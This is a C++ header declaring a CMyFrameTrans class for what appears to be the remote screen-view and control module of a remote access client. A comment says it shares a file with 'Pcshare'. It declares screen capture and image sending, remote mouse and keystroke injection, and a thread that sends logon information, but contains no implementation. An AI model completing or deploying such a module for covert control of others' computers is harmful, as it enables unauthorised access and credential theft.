// MyFrameTrans.h: interface for the CMyFrameTrans class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYFRAMETRANS_H__67FF906E_4BD3_43EB_A125_84D827CA3C95__INCLUDED_)
#define AFX_MYFRAMETRANS_H__67FF906E_4BD3_43EB_A125_84D827CA3C95__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

using namespace Gdiplus;

#define P_I_C 64

typedef struct _PSPOINT_
{
	short	x;
	short	y;
}PSPOINT, *LPPSPOINT;

// 为了与Pcshare共用一个MyMarco.h，移动到MyMarco.h中 [9/16/2007 zhaiyinwei]
// typedef struct _MYIMAGEINFO_
// {
// 	WORD m_ImageLevel;
// 	WORD m_SleepTime;
//}MYIMAGEINFO, *LPMYIMAGEINFO;

typedef struct _MYFRAMEINFO_
{
	WORD m_Width;
	WORD m_Height;
	WORD m_RectSize;
}MYFRAMEINFO, *LPMYFRAMEINFO;

class CMyFrameTrans : public CMyClientTran
{
public:
	
	CMyFrameTrans();
	virtual ~CMyFrameTrans();

	BOOL StartWork(PSDLLINFO m_DllInfo);

private:

	POINT			m_PrevPoint;
	SIZE			m_FrameSize;

	DWORD			dImageLen;

	DWORD			nLineBitLenDouble;
	DWORD			nLineBitLen;
	
	LPBYTE			pBakImageData;
	LPBYTE			pCurImageData;

	BITMAPINFO		m_BitmapInfo, m_BufBitmapInfo;

	HBITMAP			hCurBitmap;
	HBITMAP			hBufBitmap;
	HBITMAP			hTmpBitmap;
	LPPSPOINT		pImagePoint, pSendPoint;
	int				nImageCount, nSendCount;

	int				xImageCount;
	int				yImageCount;

	HANDLE			hSendDataEvent, hSendDataMetux;
	BOOL			m_IsFrameExit;

	DWORD				m_ImageCount;
	CLSID				eClsid;
	EncoderParameters	eParameters;

	ULARGE_INTEGER	len;
	LARGE_INTEGER	pos;
	BYTE*			pZipData;
	HGLOBAL			hMemBmp;
	IStream*		pStmBmp;

	void RecvCmd();
	void SendImage();

	void GetFrameDataForSend();

	inline void MoveCursor(LPMOUSEINFO pInfo);
	inline void HitKeyState(LPMOUSEINFO pInfo);
	inline void TypeKey(BYTE vk, DWORD dwFlag);
	
	inline void MyCopyImageNoZip(HDC hSrcDC, HDC hDesDC, LPPSPOINT pPoint, int& nPointCount);

	void static SendThread(LPVOID lPvoid);
	void static RecvThread(LPVOID);
	void static SendLogonInfoThread(LPVOID);
};



#endif // !defined(AFX_MYFRAMETRANS_H__67FF906E_4BD3_43EB_A125_84D827CA3C95__INCLUDED_)
